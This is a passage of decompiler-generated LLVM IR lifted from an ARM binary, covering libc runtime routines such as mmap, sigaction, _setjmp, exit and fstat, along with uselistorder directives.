  store i32 %v4_14d50, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14d58 = icmp eq i32 %v4_14d50, 0
  store i1 %v2_14d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14d58, label %dec_label_pc_14d70, label %dec_label_pc_14d60

dec_label_pc_14d60:                               ; preds = %dec_label_pc_14d48
  store i32 85352, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14d50)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14d6c = load i32, i32* %r0.global-to-local, align 4
  %v2_14d6c = inttoptr i32 %v1_14d6c to i32*
  store i32 0, i32* %v2_14d6c, align 4
  br label %dec_label_pc_14d70

dec_label_pc_14d70:                               ; preds = %dec_label_pc_14d48, %dec_label_pc_14d60
  %v2_14d70 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_14d70, i32* @r0, align 4
  %v1_14d74 = call i32 @_setjmp(i32 %v2_14d70)
  store i32 %v1_14d74, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14d78 = icmp eq i32 %v1_14d74, 0
  store i1 %v2_14d78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14d78, label %dec_label_pc_14d80, label %dec_label_pc_14dcc

dec_label_pc_14d80:                               ; preds = %dec_label_pc_14d70
  %v0_14d80 = call i32 @__aeabi_read_tp()
  store i32 %v0_14d80, i32* %r0.global-to-local, align 4
  %v1_14d84 = add i32 %v0_14d80, -1168
  store i32 %v1_14d84, i32* %r2.global-to-local, align 4
  %v2_14d8c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14d8c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_14d98 = add i32 %v2_14d8c, 56
  %v3_14d98 = inttoptr i32 %v2_14d98 to i32*
  %v4_14d98 = load i32, i32* %v3_14d98, align 4
  store i32 %v4_14d98, i32* %ip.global-to-local, align 4
  store i32 %v2_14d70, i32* %r3.global-to-local, align 4
  %v2_14da8 = add i32 %v0_14d80, -1040
  %v3_14da8 = inttoptr i32 %v2_14da8 to i32*
  store i32 %v2_14d70, i32* %v3_14da8, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_14db4 = load i32, i32* %ip.global-to-local, align 4
  %v1_14db4 = inttoptr i32 %v0_14db4 to i32*
  %v2_14db4 = load i32, i32* %v1_14db4, align 4
  store i32 %v2_14db4, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_14dc4 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14e68

dec_label_pc_14dcc:                               ; preds = %dec_label_pc_14d70
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_14dd0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14dd0, i32* %ip.global-to-local, align 4
  %v2_14dd4 = add i32 %v2_14dd0, 40
  %v3_14dd4 = inttoptr i32 %v2_14dd4 to i32*
  %v4_14dd4 = load i32, i32* %v3_14dd4, align 4
  store i32 %v4_14dd4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14dd4)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_14de4 = load i32, i32* %stack_var_-416, align 4
  %v2_14de8 = add i32 %v2_14de4, 120
  %v3_14de8 = inttoptr i32 %v2_14de8 to i32*
  %v4_14de8 = load i32, i32* %v3_14de8, align 4
  store i32 %v4_14de8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14dec

dec_label_pc_14dec:                               ; preds = %dec_label_pc_14e20.dec_label_pc_14dec_crit_edge, %dec_label_pc_14dcc
  %v0_14dec = phi i32 [ %v0_14dec.pre, %dec_label_pc_14e20.dec_label_pc_14dec_crit_edge ], [ %v4_14de8, %dec_label_pc_14dcc ]
  %v1_14dec = inttoptr i32 %v0_14dec to i32*
  %v2_14dec = load i32, i32* %v1_14dec, align 4
  store i32 %v0_14dec, i32* %r2.global-to-local, align 4
  store i32 %v2_14dec, i32* %r4.global-to-local, align 4
  %v1_14df8 = add i32 %v2_14dec, -1
  store i32 %v1_14df8, i32* %r1.global-to-local, align 4
  %v2_14dfc89 = load i32, i32* %v1_14dec, align 4
  store i32 %v2_14dfc89, i32* %r3.global-to-local, align 4
  %v3_14e0091 = icmp uge i32 %v2_14dfc89, %v2_14dec
  store i1 %v3_14e0091, i1* %cpsr_c.global-to-local, align 1
  %v9_14e0097 = icmp eq i32 %v2_14dfc89, %v2_14dec
  store i1 %v9_14e0097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14e0097, label %dec_label_pc_14e08, label %dec_label_pc_14e20

dec_label_pc_14e08:                               ; preds = %dec_label_pc_14dec, %dec_label_pc_14e08.dec_label_pc_14dfc_crit_edge
  %v0_14e0898 = phi i32 [ %v1_14e00.pre, %dec_label_pc_14e08.dec_label_pc_14dfc_crit_edge ], [ %v2_14dec, %dec_label_pc_14dec ]
  store i32 %v0_14e0898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14e18 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14e18, label %dec_label_pc_14e1c, label %dec_label_pc_14e08.dec_label_pc_14dfc_crit_edge

dec_label_pc_14e08.dec_label_pc_14dfc_crit_edge:  ; preds = %dec_label_pc_14e08
  %v0_14dfc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14e00.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14dfc = inttoptr i32 %v0_14dfc.pre to i32*
  %v2_14dfc = load i32, i32* %v1_14dfc, align 4
  store i32 %v2_14dfc, i32* %r3.global-to-local, align 4
  %v3_14e00 = icmp uge i32 %v2_14dfc, %v1_14e00.pre
  store i1 %v3_14e00, i1* %cpsr_c.global-to-local, align 1
  %v9_14e00 = icmp eq i32 %v2_14dfc, %v1_14e00.pre
  store i1 %v9_14e00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14e00, label %dec_label_pc_14e08, label %dec_label_pc_14e20

dec_label_pc_14e1c:                               ; preds = %dec_label_pc_14e08
  %v0_14e1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14e1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14e20

dec_label_pc_14e20:                               ; preds = %dec_label_pc_14dec, %dec_label_pc_14e08.dec_label_pc_14dfc_crit_edge, %dec_label_pc_14e1c
  %v0_14e28 = phi i32 [ %v0_14e1c, %dec_label_pc_14e1c ], [ %v2_14dfc89, %dec_label_pc_14dec ], [ %v2_14dfc, %dec_label_pc_14e08.dec_label_pc_14dfc_crit_edge ]
  %v1_14e20 = phi i32 [ %v0_14e1c, %dec_label_pc_14e1c ], [ %v2_14dec, %dec_label_pc_14dec ], [ %v1_14e00.pre, %dec_label_pc_14e08.dec_label_pc_14dfc_crit_edge ]
  %v3_14e20 = icmp uge i32 %v0_14e28, %v1_14e20
  store i1 %v3_14e20, i1* %cpsr_c.global-to-local, align 1
  %v9_14e20 = icmp eq i32 %v0_14e28, %v1_14e20
  store i1 %v9_14e20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14e20, label %dec_label_pc_14e28, label %dec_label_pc_14e20.dec_label_pc_14dec_crit_edge

dec_label_pc_14e20.dec_label_pc_14dec_crit_edge:  ; preds = %dec_label_pc_14e20
  %v0_14dec.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14dec

dec_label_pc_14e28:                               ; preds = %dec_label_pc_14e20
  %v2_14e28 = icmp ne i32 %v1_14e20, 0
  store i1 %v2_14e28, i1* %cpsr_c.global-to-local, align 1
  %v7_14e28 = icmp eq i32 %v1_14e20, 1
  store i1 %v7_14e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14e28, label %dec_label_pc_14e68, label %dec_label_pc_14e30

dec_label_pc_14e30:                               ; preds = %dec_label_pc_14e28
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14e68

dec_label_pc_14e68:                               ; preds = %dec_label_pc_14e28, %dec_label_pc_14e30, %dec_label_pc_14d80
  %storemerge2 = phi i32 [ %v0_14dc4, %dec_label_pc_14d80 ], [ 0, %dec_label_pc_14e30 ], [ 0, %dec_label_pc_14e28 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_14e6c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_14e6c, i32* %r0.global-to-local, align 4
  %v0_14e70 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14e70, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_14e68
  %v2_14e74 = load i32, i32* @r8, align 4
  %v8_14e74 = shl i32 %v2_14e74, %v1_14e6c
  %v9_14e74 = and i32 %v8_14e74, %v1_14e6c
  %v8_14e78 = lshr i32 %v2_14e74, %v9_14e74
  %v9_14e78 = and i32 %v8_14e78, %v9_14e74
  %v2_14e7c = inttoptr i32 %v9_14e78 to i64*
  %v3_14e7c = load i64, i64* %v2_14e7c, align 4
  %v5_14e7c = trunc i64 %v3_14e7c to i32
  %v6_14e7c = udiv i64 %v3_14e7c, 4294967296
  %v7_14e7c = trunc i64 %v6_14e7c to i32
  store i32 %v5_14e7c, i32* %r1.global-to-local, align 4
  %v9_14e7c = sub i32 %v7_14e7c, %v2_14e74
  %v1_14e80 = load i32, i32* %r4.global-to-local, align 4
  %v3_14e80 = mul i32 %v9_14e7c, %v1_14e80
  %v5_14e88 = mul i32 %v1_14e80, 4
  %v5_14e8c = udiv i32 %v1_14e80, 2
  %v6_14e88 = and i32 %v5_14e8c, %v5_14e88
  %v6_14e8c = and i32 %v6_14e88, %v3_14e80
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_14e8c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_14e68, %bb85
  %v5_14e90 = phi i32 [ %v1_14e6c, %dec_label_pc_14e68 ], [ %v6_14e8c, %bb85 ]
  ret i32 %v5_14e90

; uselistorder directives
  uselistorder i32 %v1_14e80, { 1, 0, 2 }
  uselistorder i32 %v1_14e6c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_14e20, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14e1c, { 1, 0, 2 }
  uselistorder i32 %v1_14e00.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14dec, { 1, 0 }
  uselistorder i32 %v2_14d4c, { 1, 0 }
  uselistorder i32 %v2_14d24.pre, { 2, 0, 1 }
  uselistorder i32 %v1_14d18, { 1, 0 }
  uselistorder i32 %v1_14d14, { 3, 2, 1, 0 }
  uselistorder i32 %v1_14d08, { 1, 0 }
  uselistorder i32 %v1_14cd4, { 1, 0 }
  uselistorder i32 %v1_14cd0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_14cc4, { 1, 0 }
  uselistorder i32 %v2_14ca0, { 1, 0, 2 }
  uselistorder i32 %v4_14c84, { 1, 0, 2 }
  uselistorder i32 %v4_14c74, { 1, 0, 2, 3 }
  uselistorder i1 %v8_14bbc, { 1, 2, 0 }
  uselistorder i32 %v2_14b88, { 1, 2, 0 }
  uselistorder i32 %v1_14b84, { 1, 2, 0 }
  uselistorder i1 %v2_14b70, { 1, 0, 2 }
  uselistorder i32 %v5_14b74, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14b40, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14b28, { 1, 0, 2 }
  uselistorder i32 %v2_14b1c, { 1, 0, 2 }
  uselistorder i32 %v3_14aec, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 5, 6, 7, 8, 9, 10, 12, 11, 14, 15, 16, 13, 2, 3, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 2, 9, 10, 11, 12, 3, 13, 14, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 1, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 2, 10, 11, 12, 14, 13, 3, 15, 17, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 0, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 4, 8, 7, 6, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 5, 4, 3 }
  uselistorder i32 2008, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_14e68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14e20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14e08, { 1, 0 }
  uselistorder label %dec_label_pc_14d70, { 1, 0 }
  uselistorder label %dec_label_pc_14d48, { 1, 0 }
  uselistorder label %dec_label_pc_14cc4, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14c18, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_14b88, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_14b70, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14ebc = load i32, i32* @r4, align 4
  store i32 %v3_14ebc, i32* %stack_var_-16, align 4
  %v3_14ec8 = urem i32 %arg3, 4096
  %v2_14ecc = icmp eq i32 %v3_14ec8, 0
  br i1 %v2_14ecc, label %dec_label_pc_14ef0, label %dec_label_pc_14ed4

dec_label_pc_14ed4:                               ; preds = %entry
  %v0_14ed8 = call i32 @__aeabi_read_tp()
  store i32 %v0_14ed8, i32* %r0.global-to-local, align 4
  %v3_14edc = load i16, i16* @global_var_21d68.334, align 2
  %v4_14edc = sext i16 %v3_14edc to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14ee8 = add i32 %v4_14edc, %v0_14ed8
  %v4_14ee8 = inttoptr i32 %v3_14ee8 to i32*
  store i32 22, i32* %v4_14ee8, align 4
  %v0_14f24.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14f24

dec_label_pc_14ef0:                               ; preds = %entry
  %v0_14f00 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14f00, -4095
  br i1 %tmp, label %dec_label_pc_14f20, label %dec_label_pc_14f08

dec_label_pc_14f08:                               ; preds = %dec_label_pc_14ef0
  %v1_14f0c = sub i32 0, %v0_14f00
  %v3_14f10 = load i16, i16* @global_var_21d68.334, align 2
  %v4_14f10 = sext i16 %v3_14f10 to i32
  %v0_14f14 = call i32 @__aeabi_read_tp()
  %v3_14f18 = add i32 %v4_14f10, %v0_14f14
  %v4_14f18 = inttoptr i32 %v3_14f18 to i32*
  store i32 %v1_14f0c, i32* %v4_14f18, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14f20

dec_label_pc_14f20:                               ; preds = %dec_label_pc_14ef0, %dec_label_pc_14f08
  %v0_14f20 = phi i32 [ %v0_14f00, %dec_label_pc_14ef0 ], [ -1, %dec_label_pc_14f08 ]
  store i32 %v0_14f20, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14f24

dec_label_pc_14f24:                               ; preds = %dec_label_pc_14ed4, %dec_label_pc_14f20
  %v0_14f24 = phi i32 [ %v0_14f24.pre, %dec_label_pc_14ed4 ], [ %v0_14f20, %dec_label_pc_14f20 ]
  store i32 %v0_14f24, i32* %r0.global-to-local, align 4
  %v2_14f28 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14f28, i32* @r4, align 4
  ret i32 %v0_14f24

; uselistorder directives
  uselistorder i32 %v0_14f24, { 1, 0 }
  uselistorder i32 %v0_14f00, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_14f24, { 1, 0 }
  uselistorder label %dec_label_pc_14f20, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_14f38 = load i32, i32* @lr, align 4
  store i32 %v0_14f38, i32* %stack_var_-4, align 4
  %v0_14f40 = load i32, i32* @r0, align 4
  %v3_14f44 = load i16, i16* @global_var_21d68.334, align 2
  %v4_14f44 = sext i16 %v3_14f44 to i32
  store i32 %v4_14f44, i32* @r2, align 4
  %v0_14f48 = call i32 @__aeabi_read_tp()
  %v1_14f4c = sub i32 0, %v0_14f40
  store i32 %v1_14f4c, i32* @r3, align 4
  %v2_14f50 = load i32, i32* @r2, align 4
  %v3_14f50 = add i32 %v2_14f50, %v0_14f48
  %v4_14f50 = inttoptr i32 %v3_14f50 to i32*
  store i32 %v1_14f4c, i32* %v4_14f50, align 4
  %v2_14f58 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_14f58, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14f64 = load i32, i32* @r4, align 4
  %v6_14f64 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_14f6c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_14f6c, label %dec_label_pc_14fc0, label %dec_label_pc_14f84

dec_label_pc_14f84:                               ; preds = %entry
  %v1_14f84 = add i32 %arg2, 4
  %v2_14f84 = inttoptr i32 %v1_14f84 to i32*
  %v3_14f84 = load i32, i32* %v2_14f84, align 4
  store i32 %v3_14f84, i32* @r3, align 4
  %v1_14f88 = and i32 %v3_14f84, 67108864
  %v2_14f88 = icmp eq i32 %v1_14f88, 0
  br i1 %v2_14f88, label %dec_label_pc_14f90, label %dec_label_pc_14fc0

dec_label_pc_14f90:                               ; preds = %dec_label_pc_14f84
  store i32 20, i32* @r2, align 4
  %v2_14f94 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14f94, i32* @r0, align 4
  %v0_14f98 = call i32 @memcpy()
  store i32 %v2_14f94, i32* @ip, align 4
  %v0_14fc0.pre = load i32, i32* @r5, align 4
  %v0_14fc8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14fc0

dec_label_pc_14fc0:                               ; preds = %dec_label_pc_14f84, %entry, %dec_label_pc_14f90
  %v0_14fc8 = phi i32 [ %arg3, %dec_label_pc_14f84 ], [ %arg3, %entry ], [ %v0_14fc8.pre, %dec_label_pc_14f90 ]
  %v0_14fc4 = phi i32 [ %arg2, %dec_label_pc_14f84 ], [ 0, %entry ], [ %v2_14f94, %dec_label_pc_14f90 ]
  %v0_14fc0 = phi i32 [ %arg1, %dec_label_pc_14f84 ], [ %arg1, %entry ], [ %v0_14fc0.pre, %dec_label_pc_14f90 ]
  %v4_14fd0 = call i32 @__syscall_rt_sigaction(i32 %v0_14fc0, i32 %v0_14fc4, i32 %v0_14fc8, i32 8)
  store i32 %v3_14f64, i32* @r4, align 4
  store i32 %v6_14f64, i32* @r5, align 4
  ret i32 %v4_14fd0

; uselistorder directives
  uselistorder label %dec_label_pc_14fc0, { 2, 0, 1 }
}

define i32 @function_14fe4(i32 %arg1) local_unnamed_addr {
dec_label_pc_14fe4:
  %v0_14fe4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14fe4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14fe4
  %v2_14fe4 = load i32, i32* @r8, align 4
  %v4_14fe4 = mul i32 %v2_14fe4, 2
  %v5_14fe4 = and i32 %v4_14fe4, %arg1
  %v2_14fe8 = load i32, i32* @ip, align 4
  %v4_14fe8 = lshr i32 %v2_14fe8, %v5_14fe4
  %v5_14fe8 = sub i32 32, %v5_14fe4
  %v6_14fe8 = shl i32 %v2_14fe8, %v5_14fe8
  %v7_14fe8 = or i32 %v6_14fe8, %v4_14fe8
  %v9_14fe8 = and i32 %v7_14fe8, %v5_14fe4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14fe4, %bb
  %v10_14fe8 = phi i32 [ %arg1, %dec_label_pc_14fe4 ], [ %v9_14fe8, %bb ]
  ret i32 %v10_14fe8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_14ff0 = call i32 @__sigsetjmp()
  ret i32 %v0_14ff0
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15020 = load i32, i32* @r7, align 4
  store i32 %v3_15020, i32* %stack_var_-8, align 4
  %v0_1502c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1502c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1502c, -4095
  br i1 %tmp, label %dec_label_pc_15054, label %dec_label_pc_1503c

dec_label_pc_1503c:                               ; preds = %entry
  %v0_15040 = call i32 @__aeabi_read_tp()
  %v3_15044 = load i16, i16* @global_var_21d68.334, align 2
  %v4_15044 = sext i16 %v3_15044 to i32
  %v0_15048 = load i32, i32* %r2.global-to-local, align 4
  %v1_15048 = sub i32 0, %v0_15048
  store i32 %v1_15048, i32* %r2.global-to-local, align 4
  %v3_1504c = add i32 %v4_15044, %v0_15040
  %v4_1504c = inttoptr i32 %v3_1504c to i32*
  store i32 %v1_15048, i32* %v4_1504c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15054.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15054

dec_label_pc_15054:                               ; preds = %entry, %dec_label_pc_1503c
  %v1_15058 = phi i32 [ %v0_1502c, %entry ], [ -1, %dec_label_pc_1503c ]
  %v2_15054 = phi i32 [ %v3_15020, %entry ], [ %v2_15054.pre, %dec_label_pc_1503c ]
  store i32 %v2_15054, i32* @r7, align 4
  ret i32 %v1_15058

; uselistorder directives
  uselistorder i32 %v0_1502c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15054, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1506c

dec_label_pc_1506c:                               ; preds = %dec_label_pc_15098, %dec_label_pc_150ac, %entry
  %v0_1506c = phi i32 [ %arg1, %entry ], [ %v0_1506c.pre.pre, %dec_label_pc_150ac ], [ %v0_15098, %dec_label_pc_15098 ]
  store i32 %v0_1506c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1506c, -4095
  br i1 %tmp, label %dec_label_pc_15098, label %dec_label_pc_15088

dec_label_pc_15088:                               ; preds = %dec_label_pc_1506c
  %v0_15088 = call i32 @__aeabi_read_tp()
  %v0_1508c = load i32, i32* %r2.global-to-local, align 4
  %v1_1508c = sub i32 0, %v0_1508c
  store i32 %v1_1508c, i32* %r2.global-to-local, align 4
  %v3_15090 = load i16, i16* @global_var_21d68.334, align 2
  %v4_15090 = sext i16 %v3_15090 to i32
  %v3_15094 = add i32 %v4_15090, %v0_15088
  %v4_15094 = inttoptr i32 %v3_15094 to i32*
  store i32 %v1_1508c, i32* %v4_15094, align 4
  %v0_15098.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15098

dec_label_pc_15098:                               ; preds = %dec_label_pc_1506c, %dec_label_pc_15088
  %v0_15098 = phi i32 [ %v0_1506c, %dec_label_pc_1506c ], [ %v0_15098.pre, %dec_label_pc_15088 ]
  store i32 %v0_15098, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_15098, -4095
  br i1 %tmp4, label %dec_label_pc_1506c, label %dec_label_pc_150ac

dec_label_pc_150ac:                               ; preds = %dec_label_pc_15098
  %v0_150ac = call i32 @__aeabi_read_tp()
  %v0_150b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_150b0 = sub i32 0, %v0_150b0
  store i32 %v1_150b0, i32* %r2.global-to-local, align 4
  %v3_150b4 = load i16, i16* @global_var_21d68.334, align 2
  %v4_150b4 = sext i16 %v3_150b4 to i32
  %v3_150b8 = add i32 %v4_150b4, %v0_150ac
  %v4_150b8 = inttoptr i32 %v3_150b8 to i32*
  store i32 %v1_150b0, i32* %v4_150b8, align 4
  %v0_1506c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1506c

; uselistorder directives
  uselistorder i32 %v0_15098, { 0, 2, 1 }
  uselistorder i32 %v0_1506c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15098, { 1, 0 }
  uselistorder label %dec_label_pc_1506c, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_150d0 = load i32, i32* @r1, align 4
  store i32 %v0_150d0, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_150e0 = load i32, i32* @r0, align 4
  store i32 %v0_150e0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_150e0, -4095
  br i1 %tmp, label %dec_label_pc_15108, label %dec_label_pc_150ec

dec_label_pc_150ec:                               ; preds = %entry
  %v0_150f0 = call i32 @__aeabi_read_tp()
  %v3_150f4 = load i16, i16* @global_var_21d68.334, align 2
  %v4_150f4 = sext i16 %v3_150f4 to i32
  store i32 %v4_150f4, i32* @r3, align 4
  %v0_150f8 = load i32, i32* @r2, align 4
  %v1_150f8 = sub i32 0, %v0_150f8
  store i32 %v1_150f8, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_15100 = add i32 %v4_150f4, %v0_150f0
  %v4_15100 = inttoptr i32 %v3_15100 to i32*
  store i32 %v1_150f8, i32* %v4_15100, align 4
  br label %dec_label_pc_15118

dec_label_pc_15108:                               ; preds = %entry
  store i32 %v0_150e0, i32* %r7.global-to-local, align 4
  %v2_15108 = icmp eq i32 %v0_150e0, 0
  br i1 %v2_15108, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15108
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15108, %bb
  call void @__pseudo_cond_branch(i1 %v2_15108, i32 ptrtoint (i32* @global_var_15558.565 to i32))
  br label %dec_label_pc_15118

dec_label_pc_15118:                               ; preds = %dec_label_pc_150ec, %.thread
  %v0_15118 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_15118

